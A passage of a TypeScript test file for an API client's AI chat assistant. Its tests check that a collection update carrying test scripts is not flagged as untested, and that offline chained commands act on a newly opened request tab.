        "collection_untested",
      ])
    })

    it("doesn't flag an upsert that wrote tests", async () => {
      setRESTCollections([apiCollection()])
      await mount()

      await turn([
        {
          id: "1",
          name: "add_or_update_collection_requests",
          input: {
            collection: "API",
            requests: [
              {
                name: "login",
                method: "GET",
                url: "https://api.example",
                testScript: "pw.test('ok', () => {})",
              },
            ],
          },
        },
      ])

      expect(chat.lastTurnTools.value).toEqual([
        "add_or_update_collection_requests",
      ])
    })
  })

  describe("offline chained commands", () => {
    const ai = platform.experiments!.aiExperiments as unknown as {
      chat?: unknown
    }
    let online: unknown

    beforeEach(() => {
      online = ai.chat
      ai.chat = undefined
    })

    afterEach(() => {
      ai.chat = online
    })

    it("acts on the tab an earlier step opened", async () => {
      const a = tabs.createNewTab(restTab("https://a.example"))
      tabs.setActiveTab(a.id)
      await mount()

      await chat.sendMessage(
        "open a new tab and set url to https://b.example and run the request",
        ""
      )

      const opened = tabs.currentActiveTab.value
      expect(opened.id).not.toBe(a.id)
      expect(sent).toEqual([opened.id])
      const doc = tabs.getTabRef(a.id).value.document
      if (doc.type !== "request") throw new Error("not a request tab")
      expect(doc.request.endpoint).toBe("https://a.example")
      expect(chat.lastTurnTools.value).toContain("run_request")
    })
  })
})
